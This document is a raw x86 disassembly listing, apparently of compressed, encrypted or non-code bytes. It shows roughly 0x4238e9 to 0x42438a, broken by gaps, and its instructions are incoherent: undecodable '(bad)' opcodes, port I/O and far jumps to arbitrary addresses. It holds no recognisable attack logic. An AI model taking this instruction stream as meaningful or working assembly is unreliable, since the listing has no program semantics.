  4238e9:	ja     0x4238ac
  4238eb:	jmp    0x96fa:0xcff52e09
  4238f2:	jbe    0x42393e
  4238f4:	push   ecx
  4238f5:	nop
  4238f6:	adc    edx,DWORD PTR [eax-0x46]
  4238f9:	imul   ecx,DWORD PTR [edx],0x6f36e542
  4238ff:	ret    0x5c3c
  423902:	sbb    esp,DWORD PTR [edx+eax*1+0x4645b7d5]
  423909:	pop    esp
  42390a:	fnstenv [ebx-0x1fae042]
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xe42d2bbd
  423982:	call   0x400:0x17b788f
  423989:	add    DWORD PTR [eax],eax
  42398b:	add    bl,bh
  42398d:	jae    0x423980
  42398f:	or     BYTE PTR [esi-0x2d2054ca],dh
  423995:	int    0x1b
  423997:	shr    BYTE PTR [eax+0x71301eb2],1
  42399d:	pop    ebp
  42399e:	xor    DWORD PTR [edi+0x36],ebp
  4239a1:	cmp    DWORD PTR [edi],0x43cd5b52
  4239a7:	mov    WORD PTR [ebp+0x7e8c9497],cs
  4239ad:	std    
  4239ae:	pop    ebp
  4239af:	iret   
  4239b0:	rol    DWORD PTR [eax],cl
  4239b2:	int3   
  4239b3:	adc    DWORD PTR [edx+0x3dbf7c79],ebp
  4239b9:	inc    esi
  4239ba:	jo     0x423a37
  4239bc:	not    BYTE PTR [ecx-0x1]
  4239bf:	scas   eax,DWORD PTR es:[edi]
  4239c0:	clc    
  4239c1:	adc    al,BYTE PTR [ecx+edx*1+0x42]
  4239c5:	sbb    al,0xae
  4239c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239c8:	call   ebp
  4239ca:	sbb    eax,0x8b99824b
  4239cf:	or     esi,DWORD PTR [edx]
  4239d1:	or     al,0x86
  4239d3:	xchg   esp,eax
  4239d4:	rol    DWORD PTR [ecx],cl
  4239d6:	adc    eax,ecx
  4239d8:	icebp  
  4239d9:	sub    esp,DWORD PTR [edi-0x1f]
  4239dc:	mov    al,ds:0x5a9ef0da
  4239e2:	inc    edi
  4239e3:	and    eax,0x6fa433c1
  4239e8:	mov    cl,0xee
  4239ea:	mov    esp,0xa3f66555
  4239ef:	pop    esp
  4239f0:	iret   
  4239f1:	pop    edi
  4239f2:	nop
  4239f3:	jg     0x423980
  4239f5:	xchg   ebx,eax
  4239f6:	test   BYTE PTR [eax+0x285d5f15],0xe9
  4239fd:	scas   eax,DWORD PTR es:[edi]
  4239fe:	inc    edi
  4239ff:	cmp    edi,DWORD PTR [eax+0x4bca9bd1]
  423a05:	ret    0xbd45
  423a08:	push   es
  423a09:	xchg   BYTE PTR [eax-0x40],al
  423a0c:	addr16 pop eax
  423a0e:	xchg   ebx,eax
  423a0f:	pop    es
  423a10:	mov    dl,0xd3
  423a12:	jge    0x423a74
  423a14:	fld    QWORD PTR [edx-0x10]
  423a17:	mov    edi,DWORD PTR [eax-0x19d5f734]
  423a1d:	sub    al,0xd0
  423a1f:	adc    ah,ah
  423a21:	loop   0x4239ff
  423a23:	iret   
  423a24:	mov    dh,dh
  423a26:	clc    
  423a27:	pop    es
  423a28:	dec    esp
  423a29:	jge    0x4239b4
  423a2b:	dec    ecx
  423a2c:	nop
  423a2d:	jecxz  0x423a54
  423a2f:	pop    edx
  423a30:	rcl    DWORD PTR [eax+ebx*1],cl
  423a33:	test   DWORD PTR [esi],esi
  423a35:	sbb    eax,0x1bd86c99
  423a3a:	cwde   
  423a3b:	arpl   WORD PTR [esi+0x5f],sp
  423a3e:	add    al,0x8a
  423a40:	jne    0x423a98
  423a42:	mov    bl,0xc1
  423a44:	or     DWORD PTR [ebx-0x2d35bada],eax
  423a4a:	dec    edx
  423a4b:	sbb    eax,0x311c877
  423a50:	adc    DWORD PTR [ecx],0x24
  423a53:	dec    eax
  423a54:	shl    BYTE PTR [ebp-0x1979d4d],1
  423a5a:	xor    cl,dh
  423a5c:	dec    edx
  423a5d:	inc    esi
  423a5e:	daa    
  423a5f:	shr    BYTE PTR [ecx+0x5061ceda],0x2a
  423a66:	or     eax,0xb29e62b2
  423a6b:	jno    0x423a71
  423a6d:	push   esp
  423a6e:	mov    WORD PTR [edx-0x51c701fb],fs
  423a74:	xor    al,0xbb
  423a76:	or     al,0x44
  423a78:	out    0xa2,al
  423a7a:	cmp    al,0xd7
  423a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a7d:	and    eax,0xefa944ec
  423a82:	push   esp
  423a83:	inc    edi
  423a84:	(bad)  
  423a85:	in     eax,dx
  423a86:	test   DWORD PTR [esi],edi
  423a88:	lea    esp,[edi+0x29b6d0c]
  423a8e:	fistp  DWORD PTR [eax+0x0]
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	push   eax
  423b01:	stc    
  423b02:	xchg   ebx,eax
  423b03:	out    dx,al
  423b04:	jl     0x423b82
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	mov    esp,0x28834884
  423b11:	or     DWORD PTR cs:[edx+0x247904ea],esi
  423b18:	jno    0x423ac4
  423b1a:	lahf   
  423b1b:	push   ecx
  423b1c:	cmp    DWORD PTR [edi-0x1b773e5],eax
  423b22:	retf   0xbc83
  423b25:	leave  
  423b26:	aaa    
  423b27:	mov    dl,0x2a
  423b29:	inc    eax
  423b2a:	sti    
  423b2b:	dec    edx
  423b2c:	mov    dl,BYTE PTR [esi-0x2b]
  423b2f:	inc    eax
  423b30:	lods   eax,DWORD PTR ds:[esi]
  423b31:	add    eax,ebp
  423b33:	jae    0x423acb
  423b35:	adc    DWORD PTR [esi-0x5d],0xffffffcb
  423b39:	xchg   ebp,eax
  423b3a:	pop    ds
  423b3b:	sbb    al,0x32
  423b3d:	mov    dl,0x18
  423b3f:	jb     0x423b54
  423b41:	add    edx,DWORD PTR [ebp-0x6b]
  423b44:	mov    al,0xe2
  423b46:	dec    esi
  423b47:	(bad)  [edi]
  423b49:	dec    ecx
  423b4a:	push   edi
  423b4b:	adc    edx,DWORD PTR [esi-0x2639aed2]
  423b51:	ret    
  423b52:	mov    dl,0x1b
  423b54:	push   esp
  423b55:	sbb    BYTE PTR [ebp+0x294eb289],ah
  423b5b:	imul   ebp,edx,0x613f7f13
  423b61:	scas   eax,DWORD PTR es:[edi]
  423b62:	inc    ebp
  423b63:	xlat   BYTE PTR ds:[ebx]
  423b64:	pop    ss
  423b65:	call   0xea96:0xb5358039
  423b6c:	cld    
  423b6d:	xor    DWORD PTR [eax+0x65d6fdd7],edx
  423b73:	pop    edi
  423b74:	sahf   
  423b75:	xor    eax,0x5c24d81c
  423b7a:	int    0x85
  423b7c:	or     eax,0x797d8f19
  423b81:	fnop   
  423b83:	pop    ss
  423b84:	push   ecx
  423b85:	lds    edx,FWORD PTR [ecx+0x687a95ba]
  423b8b:	fistp  DWORD PTR [ecx+0x2c9b3da0]
  423b91:	sbb    eax,0x2c314bb
  423b96:	pop    ds
  423b97:	sar    DWORD PTR [eax+0x29],0xa4
  423b9b:	cmc    
  423b9c:	into   
  423b9d:	leave  
  423b9e:	rol    bl,cl
  423ba0:	rcl    BYTE PTR [ebp+0x6b],cl
  423ba3:	scas   eax,DWORD PTR es:[edi]
  423ba4:	inc    esi
  423ba5:	add    ebx,ecx
  423ba7:	jnp    0x423bde
  423ba9:	jmp    0x423b79
  423bab:	mov    eax,ds:0xfdfccee0
  423bb0:	fild   WORD PTR [ecx]
  423bb2:	and    eax,0x4b9a224c
  423bb7:	mov    al,0x69
  423bb9:	ds and eax,0xd6bac60c
  423bbf:	sub    eax,0x656e64ee
  423bc4:	enter  0xb1e4,0xdf
  423bc8:	lds    ecx,FWORD PTR [eax]
  423bca:	jge    0x423b4c
  423bcc:	add    eax,0xb26e5779
  423bd1:	add    eax,0x5541057a
  423bd6:	push   ecx
  423bd7:	push   cs
  423bd8:	push   es
  423bd9:	and    eax,0x56fcabfd
  423bde:	xor    dl,BYTE PTR [edi-0x7c714762]
  423be4:	jp     0x423c4e
  423be6:	sub    eax,eax
  423be8:	xchg   esp,eax
  423be9:	adc    bl,BYTE PTR [ecx-0x75d634a1]
  423bef:	push   ebx
  423bf0:	fisttp QWORD PTR [edi+0x21d88c28]
  423bf6:	inc    edi
  423bf7:	xor    DWORD PTR [ecx+0x75ef304b],ecx
  423bfd:	inc    ebp
  423bfe:	cmp    esp,DWORD PTR [edx+edi*2-0x363613d4]
  423c05:	jb     0x423c0d
  423c07:	test   al,0xce
  423c09:	lods   eax,DWORD PTR ds:[esi]
  423c0a:	xchg   DWORD PTR [esi+0x4b],ebx
  423c0d:	xchg   esp,eax
  423c0e:	call   0x423ccc
	...
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x34446617]
  423c81:	retf   
  423c82:	(bad)  
  423c83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c84:	cmp    BYTE PTR [ebp+0x1],0x0
  423c88:	add    al,0x1
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	or     bh,BYTE PTR ss:[edx]
  423c8f:	stos   DWORD PTR es:[edi],eax
  423c90:	lock loope 0x423ce2
  423c93:	xor    BYTE PTR [ecx+ebp*2-0x1f6a7db6],bl
  423c9a:	mov    edi,0x646d71d2
  423c9f:	jle    0x423c46
  423ca1:	cmc    
  423ca2:	xor    al,0xb4
  423ca4:	jmp    0xfe8ef2ac
  423ca9:	adc    eax,0xebaf78e1
  423cae:	ret    0xb6ea
  423cb1:	dec    edx
  423cb2:	aad    0xbc
  423cb4:	pop    esp
  423cb5:	mov    ah,0x45
  423cb7:	imul   esp,ebp,0xd1beff1
  423cbd:	push   ebx
  423cbf:	or     al,0x15
  423cc2:	pop    es
  423cc3:	xlat   BYTE PTR ds:[ebx]
  423cc4:	cwde   
  423cc5:	dec    ecx
  423cc6:	inc    ebp
  423cc7:	sahf   
  423cc8:	adc    eax,0x1d4a7ba6
  423ccd:	aam    0x9a
  423ccf:	inc    ebp
  423cd0:	inc    eax
  423cd1:	loopne 0x423c9e
  423cd3:	pop    eax
  423cd4:	push   edi
  423cd5:	dec    edx
  423cd6:	push   0xc2ed26cc
  423cdb:	shl    BYTE PTR [edi+0x15a95f97],1
  423ce1:	stos   BYTE PTR es:[edi],al
  423ce2:	fs sbb eax,0xad3f6d9d
  423ce8:	jno    0x423d25
  423cea:	lea    edi,[ecx]
  423cec:	repz add esp,esp
  423cef:	inc    edi
  423cf0:	pop    eax
  423cf1:	dec    eax
  423cf2:	lods   eax,DWORD PTR ds:[esi]
  423cf3:	iret   
  423cf4:	mov    ecx,0x17fcc302
  423cf9:	dec    edi
  423cfa:	frstor [esi+eiz*8-0x1bfe6bf1]
  423d01:	mov    esi,0x99f6679b
  423d06:	cwde   
  423d07:	call   0xda54f4d1
  423d0c:	and    DWORD PTR [edx+0x32],esp
  423d0f:	popa   
  423d10:	scas   eax,DWORD PTR es:[edi]
  423d11:	sti    
  423d12:	xor    BYTE PTR [ecx+esi*2-0xa],dh
  423d16:	and    al,0xa4
  423d18:	xchg   ecx,eax
  423d19:	mov    esp,DWORD PTR [eax+0x10]
  423d1c:	mov    eax,0xafe10e5b
  423d21:	ja     0x423d02
  423d23:	cdq    
  423d24:	into   
  423d25:	or     bh,BYTE PTR [ecx-0x643a7662]
  423d2b:	aad    0xe7
  423d2d:	cs (bad) 
  423d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d30:	in     eax,dx
  423d31:	mov    al,ds:0x93fbf1d4
  423d36:	aam    0x98
  423d38:	sti    
  423d39:	mov    eax,0x5fa73aa6
  423d3e:	xchg   ebp,eax
  423d3f:	fs adc al,0xb
  423d42:	adc    DWORD PTR [ebx+0x28],edi
  423d45:	nop
  423d46:	sahf   
  423d47:	sub    eax,0x393a4daa
  423d4c:	dec    edx
  423d4d:	arpl   WORD PTR [ecx-0xc],dx
  423d50:	adc    BYTE PTR [edi],ah
  423d52:	mov    dh,BYTE PTR [ebp+0x54]
  423d55:	sbb    DWORD PTR [eax-0x42],esi
  423d58:	push   ds
  423d59:	add    edi,DWORD PTR [edx]
  423d5b:	test   BYTE PTR [eax+ecx*4+0x48],ah
  423d5f:	hlt    
  423d60:	or     al,0xdd
  423d62:	mov    BYTE PTR [eax],0x88
  423d65:	sbb    BYTE PTR gs:[ebp-0x30],al
  423d69:	fiadd  WORD PTR [edx]
  423d6b:	xor    eax,0x7fa6ecb7
  423d70:	inc    ecx
  423d71:	and    al,cl
  423d73:	and    al,0x7f
  423d75:	xor    ebx,DWORD PTR [ebp+0x2bd6befa]
  423d7b:	and    dh,ch
  423d7d:	test   al,0x1
  423d7f:	mov    es,WORD PTR [edi-0x487d44d6]
  423d85:	inc    ecx
  423d86:	mov    ebx,0xad69d586
  423d8b:	xor    bh,bh
  423d8d:	sbb    al,0xe6
  423d8f:	sub    DWORD PTR [eax],eax
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x11d813d2],esp
  423e03:	je     0x4423f87
  423e09:	add    DWORD PTR [eax],eax
  423e0b:	add    BYTE PTR [edx+0x33f5f0c2],ah
  423e11:	dec    esi
  423e12:	jae    0x423e32
  423e14:	xor    eax,0x6a0e205
  423e19:	push   esi
  423e1a:	out    0x61,al
  423e1c:	xor    dh,ch
  423e1e:	xchg   bh,al
  423e20:	xchg   ecx,eax
  423e21:	mov    ds:0x5e83bc70,eax
  423e26:	push   edx
  423e27:	(bad)  
  423e28:	mov    eax,0x96b8b926
  423e2d:	jle    0x423e66
  423e2f:	mov    ds:0xcb92bebf,eax
  423e34:	adc    ebp,esi
  423e36:	push   0xfa82db88
  423e3b:	lods   eax,DWORD PTR ds:[esi]
  423e3c:	(bad)  
  423e3e:	or     eax,0x929c4d66
  423e43:	or     BYTE PTR [eax+0x11023094],bl
  423e49:	and    al,BYTE PTR [esi-0x3337d7d0]
  423e4f:	dec    ebx
  423e50:	xchg   esp,eax
  423e51:	test   DWORD PTR [edx+ebx*1-0x4b4ae46c],ecx
  423e58:	icebp  
  423e59:	jge    0x423e77
  423e5b:	enter  0x7905,0xf4
  423e5f:	adc    eax,0x51727323
  423e64:	and    al,cl
  423e66:	dec    ecx
  423e67:	je     0x423e07
  423e69:	in     al,dx
  423e6a:	cmp    eax,0xbdcfa60d
  423e6f:	fstp   QWORD PTR [esi+0x20844e4e]
  423e75:	sti    
  423e76:	mov    ds:0xd0cbbf9d,al
  423e7b:	call   0xa152:0x6634b3d
  423e82:	ins    DWORD PTR es:[edi],dx
  423e83:	mov    DWORD PTR [ebx],edx
  423e85:	jmp    0x423e3a
  423e87:	push   es
  423e88:	ds pop es
  423e8a:	push   ecx
  423e8b:	aas    
  423e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e8d:	push   esi
  423e8e:	mov    bl,0xff
  423e90:	in     al,dx
  423e91:	xor    BYTE PTR [ebp-0x1f8b6983],al
  423e97:	sbb    al,0x27
  423e99:	div    BYTE PTR [ebp+0x7f]
  423e9c:	mov    ss,WORD PTR [edx*2+0x2decd016]
  423ea3:	lea    esp,[esi+eax*2-0x2ce1a153]
  423eaa:	out    0x89,eax
  423eac:	retf   
  423ead:	sahf   
  423eae:	(bad)  
  423eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eb0:	sub    edx,ebp
  423eb2:	pop    es
  423eb3:	shr    DWORD PTR [eax],0xb3
  423eb6:	mov    edi,0x6c8ca1a3
  423ebb:	adc    ebp,esp
  423ebd:	xchg   ebp,eax
  423ebe:	mov    al,ds:0x5b8748ab
  423ec3:	cmp    edi,ebx
  423ec5:	ds mov ax,es:0xe6d3081d
  423ecd:	push   ebp
  423ece:	add    bl,cl
  423ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ed1:	jmp    0x423ea5
  423ed3:	jmp    0xb6d30bda
  423ed8:	idiv   BYTE PTR [eax+eax*4-0x1]
  423edc:	jp     0x423f18
  423ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423edf:	sub    dh,0xaa
  423ee2:	iret   
  423ee3:	cli    
  423ee4:	or     bh,BYTE PTR [ebx+ecx*8]
  423ee7:	mov    ecx,0x92660f8b
  423eec:	jmp    FWORD PTR ds:0x1de1241f
  423ef2:	mov    eax,ds:0x30e9c72c
  423ef7:	scas   al,BYTE PTR es:[edi]
  423ef8:	xchg   esp,eax
  423ef9:	in     al,dx
  423efa:	mov    eax,0xafafb818
  423eff:	push   ss
  423f00:	iret   
  423f01:	adc    dh,bl
  423f03:	outs   dx,BYTE PTR ds:[esi]
  423f04:	mov    ebp,DWORD PTR [eax-0x47]
  423f07:	xor    DWORD PTR [edi+0x3d4f2184],edx
  423f0d:	jge    0x423eea
  423f0f:	scas   eax,DWORD PTR es:[edi]
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	inc    eax
  423f81:	xlat   BYTE PTR ds:[ebx]
  423f82:	jmp    0x400:0x17f8838
  423f89:	add    DWORD PTR [eax],eax
  423f8b:	add    BYTE PTR [eax+eiz*1+0x37],al
  423f8f:	enter  0x26eb,0x2f
  423f93:	push   0xffffff99
  423f95:	das    
  423f96:	outs   dx,BYTE PTR ds:[esi]
  423f97:	mov    al,ds:0x684a2577
  423f9c:	xchg   ebp,eax
  423f9d:	fstp   DWORD PTR [esi]
  423f9f:	pop    eax
  423fa0:	cmp    ah,BYTE PTR [ecx-0x329bcb82]
  423fa6:	ds mov bl,0xeb
  423fa9:	sub    bh,BYTE PTR [esi-0x8744591]
  423faf:	jno    0x423fa1
  423fb1:	jl     0x42402a
  423fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fb4:	cmp    DWORD PTR [ebp+0x2ef67492],esp
  423fba:	mov    fs,WORD PTR [ecx+edi*8]
  423fbd:	add    BYTE PTR [edx+0x620aaba4],cl
  423fc3:	dec    edx
  423fc4:	out    dx,eax
  423fc5:	popf   
  423fc6:	ss pop eax
  423fc8:	outs   dx,DWORD PTR ds:[esi]
  423fc9:	shl    DWORD PTR [esi-0x10f5caec],0xdb
  423fd0:	and    bh,bl
  423fd2:	loop   0x424017
  423fd4:	fdiv   DWORD PTR [edx]
  423fd6:	or     BYTE PTR [ecx],ch
  423fd8:	jmp    0x423fc8
  423fda:	xchg   BYTE PTR [ebx-0x3f],bl
  423fdd:	xchg   ebx,eax
  423fde:	lahf   
  423fdf:	sub    ecx,esp
  423fe1:	sbb    dh,BYTE PTR ds:0x94381025
  423fe7:	push   ds
  423fe8:	xchg   edx,eax
  423fe9:	gs sbb al,0xbb
  423fec:	sar    DWORD PTR [ebx+0x14],0x43
  423ff0:	xchg   ecx,eax
  423ff1:	jbe    0x42403c
  423ff3:	xchg   esp,eax
  423ff4:	push   ebx
  423ff5:	xchg   esp,eax
  423ff6:	outs   dx,DWORD PTR ds:[esi]
  423ff7:	xor    ebx,DWORD PTR [edx+eiz*4-0x3a]
  423ffb:	jae    0x42401e
  423ffd:	mov    ch,0x1a
  423fff:	jmp    0xe3b5:0x8b088416
  424006:	sub    eax,0x838cadf5
  42400b:	jmp    0x423fcf
  42400d:	mov    edi,0x5061ad54
  424012:	adc    DWORD PTR [esi],eax
  424014:	pcmpgtb mm1,QWORD PTR [ecx-0x78]
  424018:	jg     0x424091
  42401a:	dec    ecx
  42401b:	inc    edi
  42401c:	inc    edi
  42401d:	mov    ecx,cs
  42401f:	or     edi,edx
  424021:	mov    ecx,0x2589e0d9
  424026:	jmp    0x365f:0x79761257
  42402d:	push   esp
  42402e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42402f:	adc    DWORD PTR ds:0xdfed294d,esp
  424035:	or     DWORD PTR [edi+0x3c],eax
  424038:	sbb    dl,0x1
  42403b:	ror    DWORD PTR [ecx+eax*8],cl
  42403e:	push   esi
  42403f:	cmp    edi,esp
  424041:	sbb    ebx,0x4c
  424044:	ins    BYTE PTR es:[edi],dx
  424045:	pop    ebx
  424046:	dec    ebp
  424047:	xor    ebx,DWORD PTR [eax-0x2802ad6d]
  42404d:	sahf   
  42404e:	sub    cl,BYTE PTR [edx]
  424050:	dec    ecx
  424051:	fld    st(0)
  424053:	fcom   st(1)
  424055:	mov    cl,0xd5
  424057:	ret    
  424058:	mov    esi,0xe94f793
  42405d:	outs   dx,DWORD PTR ds:[esi]
  42405e:	ret    0x6ebd
  424061:	setle  BYTE PTR [edi+0x58]
  424065:	xor    DWORD PTR [eax],edx
  424067:	pop    es
  424068:	dec    edx
  424069:	das    
  42406a:	daa    
  42406b:	(bad)  
  42406c:	mov    edi,0xc7727d4a
  424071:	aas    
  424072:	adc    eax,0xd9ac8618
  424077:	mov    esp,0x58d445f
  42407c:	and    DWORD PTR [edx+ebp*4-0x4f],ebx
  424080:	and    DWORD PTR [ebx-0x6d],ecx
  424083:	pop    esp
  424084:	pop    ds
  424085:	fistp  QWORD PTR [ecx-0x38]
  424088:	jp     0x424066
  42408a:	xchg   ebp,eax
  42408b:	cli    
  42408c:	or     eax,0xd466ab
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	inc    esi
  424101:	xchg   BYTE PTR [esp+eiz*4-0x74],ch
  424105:	add    BYTE PTR [ecx],0x0
  424108:	add    al,0x1
  42410a:	add    BYTE PTR [eax],al
  42410c:	loopne 0x424170
  42410e:	and    BYTE PTR [eax],ch
  424110:	xor    edi,edx
  424112:	retf   0x5a71
  424115:	cmp    BYTE PTR [eax+eax*4+0x134cf25d],al
  42411c:	sub    al,0xf2
  42411e:	imul   edx,DWORD PTR [edx-0x371142ee],0xfb215dac
  424128:	ins    BYTE PTR es:[edi],dx
  424129:	sub    eax,0x24bba90d
  42412e:	jmp    0x424160
  424130:	(bad)  
  424131:	xchg   ebp,eax
  424132:	ret    
  424133:	mov    ds:0x4f7bb20d,al
  424138:	add    eax,0x58f21fd1
  42413d:	in     al,dx
  42413e:	mov    ebp,0x377abfcc
  424143:	imul   esi,DWORD PTR [ebx*8-0x7331281f],0x44ac07fb
  42414e:	dec    ecx
  42414f:	add    ebp,ebp
  424151:	shl    BYTE PTR [edi+ebp*4],cl
  424154:	sti    
  424155:	sub    ebp,DWORD PTR [ebp+0x41]
  424158:	mov    WORD PTR [ebp-0x59],ss
  42415b:	in     eax,0xa
  42415d:	loopne 0x424130
  42415f:	push   0xffffffbc
  424161:	shl    edi,1
  424163:	push   ss
  424164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424165:	ja     0x4240ed
  424167:	in     al,dx
  424168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424169:	stos   BYTE PTR es:[edi],al
  42416a:	sub    BYTE PTR [ecx+0x6dd03f35],0x88
  424171:	fistp  QWORD PTR ds:0x80117a37
  424177:	mov    esp,0x6ab2a76c
  42417c:	int3   
  42417d:	cmp    al,al
  42417f:	pop    esp
  424180:	imul   eax,DWORD PTR [ebx-0x43706500],0x8ed9e3e6
  42418a:	mov    ds,ebp
  42418c:	dec    eax
  42418d:	jne    0x4241aa
  42418f:	and    BYTE PTR [edi+ebp*8+0x6d],al
  424193:	sbb    DWORD PTR [ecx+0x5946fd8e],edi
  424199:	scas   al,BYTE PTR es:[edi]
  42419a:	add    dl,BYTE PTR ds:0xd0aa75be
  4241a0:	mov    DWORD PTR [edx],ebp
  4241a2:	mov    dh,0xf4
  4241a4:	in     eax,0xda
  4241a6:	hlt    
  4241a7:	ds jo  0x4241de
  4241aa:	je     0x4241bd
  4241ac:	mov    eax,0x3f0909a9
  4241b1:	(bad)  
  4241b2:	and    DWORD PTR [ecx-0x3583a71b],eax
  4241b8:	cli    
  4241b9:	cwde   
  4241ba:	push   edi
  4241bb:	or     DWORD PTR [eax+0x36],ebp
  4241be:	mov    bl,0x81
  4241c0:	loop   0x4241b4
  4241c2:	dec    edi
  4241c3:	pop    ebx
  4241c4:	int3   
  4241c5:	out    0xfe,eax
  4241c7:	daa    
  4241c8:	and    DWORD PTR [edi+0x49],esi
  4241cb:	adc    DWORD PTR [ecx+0xd5a2f26],0xffffff9a
  4241d2:	not    DWORD PTR [edx+0x447353cd]
  4241d8:	pop    eax
  4241d9:	add    eax,0x216725c7
  4241de:	out    0xad,al
  4241e0:	jo     0x424244
  4241e2:	popf   
  4241e3:	sahf   
  4241e4:	jmp    0x424261
  4241e6:	repnz pop edi
  4241e8:	add    esi,DWORD PTR ds:0x472529cb
  4241ee:	xor    eax,DWORD PTR [ebx]
  4241f0:	mov    esi,0x8cde5fdc
  4241f5:	stos   DWORD PTR es:[edi],eax
  4241f6:	mov    edi,0x27b9615e
  4241fb:	and    eax,DWORD PTR [eax-0x70]
  4241fe:	and    eax,0x2954b444
  424203:	sub    ebx,DWORD PTR [esi]
  424205:	pop    ebx
  424206:	rol    bh,0xd
  424209:	cmp    eax,0xaf6b6ebb
  42420e:	ins    DWORD PTR es:[edi],dx
  42420f:	nop
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	ins    DWORD PTR es:[edi],dx
  424281:	mov    bh,0x50
  424283:	int    0x90
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    BYTE PTR [ebx],dh
  42428d:	mov    ebp,DWORD PTR [eax+0x2a]
  424290:	adc    bh,BYTE PTR [edi-0xc]
  424293:	out    0xd,eax
  424295:	jmp    0x4242fa
  424297:	shl    BYTE PTR [esi-0x13],1
  42429a:	pushf  
  42429b:	fnstenv [edx]
  42429d:	(bad)  
  42429e:	cmp    bl,0xbb
  4242a1:	stos   DWORD PTR es:[edi],eax
  4242a2:	add    edi,DWORD PTR [ebx-0x36]
  4242a5:	fdiv   QWORD PTR [edx+0x3aa989c0]
  4242ab:	test   eax,0x99120b54
  4242b0:	mov    ecx,DWORD PTR [edi-0x29]
  4242b3:	clc    
  4242b4:	out    0x78,al
  4242b6:	jne    0x4242f6
  4242b8:	cmp    DWORD PTR [ebp+0x619346be],ecx
  4242be:	dec    ebp
  4242bf:	aam    0x16
  4242c1:	mov    ebx,0xaea5b664
  4242c6:	mov    ecx,0xcbd33687
  4242cb:	xchg   ebp,eax
  4242cc:	dec    BYTE PTR ds:0x3fca
  4242d1:	add    cl,ah
  4242d3:	xor    BYTE PTR [ecx-0x413ebd0b],dh
  4242d9:	xor    eax,0xe1bbee75
  4242de:	int    0x7a
  4242e0:	pop    ds
  4242e1:	dec    eax
  4242e2:	popa   
  4242e3:	dec    esp
  4242e4:	stc    
  4242e5:	loop   0x42430d
  4242e7:	jbe    0x42434b
  4242e9:	je     0x424346
  4242eb:	cmp    BYTE PTR [ecx+0x1e04ff36],bl
  4242f1:	cmc    
  4242f2:	cmp    DWORD PTR [ecx+0x72a53577],ecx
  4242f8:	shr    BYTE PTR [edi+0x9],0x4b
  4242fc:	(bad)  
  4242fd:	cmc    
  4242fe:	shr    BYTE PTR [eax-0x72],1
  424301:	test   BYTE PTR [ecx-0x50],dh
  424304:	sahf   
  424305:	push   0xc595779b
  42430a:	sub    esp,edx
  42430c:	lods   al,BYTE PTR ds:[esi]
  42430d:	mov    bh,0xa2
  42430f:	xchg   BYTE PTR [edi+0x42],cl
  424312:	int    0xb7
  424314:	inc    ebp
  424315:	dec    edi
  424316:	xchg   esp,eax
  424317:	fdivr  st,st(7)
  424319:	sub    BYTE PTR [ecx],dl
  42431b:	dec    esp
  42431c:	adc    DWORD PTR [eiz*8-0x79f16f5c],edi
  424323:	retf   
  424324:	call   0x5e02e220
  424329:	sub    DWORD PTR [ebx],eax
  42432b:	fimul  DWORD PTR [edi]
  42432d:	inc    esi
  42432e:	mov    ch,0x1e
  424330:	pop    edx
  424331:	sbb    al,0xdb
  424333:	sub    ch,dh
  424335:	retf   
  424336:	cmp    eax,0x5ee9d71c
  42433b:	inc    edi
  42433c:	mov    ecx,0xfa2acb34
  424341:	mov    DWORD PTR [ebx-0x79ca80fd],ecx
  424347:	imul   edi,DWORD PTR [ebp+0x122073c7],0x148d329f
  424351:	or     DWORD PTR [edx+0x2e2b614d],esp
  424357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424358:	ret    0xa11
  42435b:	test   BYTE PTR [ecx+eiz*4+0x1],0x38
  424360:	jnp    0x4243cd
  424362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424363:	push   0x61
  424365:	data16 adc BYTE PTR [ecx-0x12af7eda],bl
  42436c:	test   dh,al
  42436e:	jb     0x424399
  424370:	outs   dx,DWORD PTR ds:[esi]
  424371:	ins    BYTE PTR es:[edi],dx
  424372:	jmp    FWORD PTR [eax+ebp*4+0x76]
  424376:	mov    ah,0x5f
  424378:	jno    0x4243db
  42437a:	mov    eax,0x491b1ae6
  42437f:	mov    BYTE PTR [edi],bh
  424381:	loop   0x4243d6
  424383:	ja     0x424349
  424385:	mov    edx,0x17931862
  42438a:	pop    eax
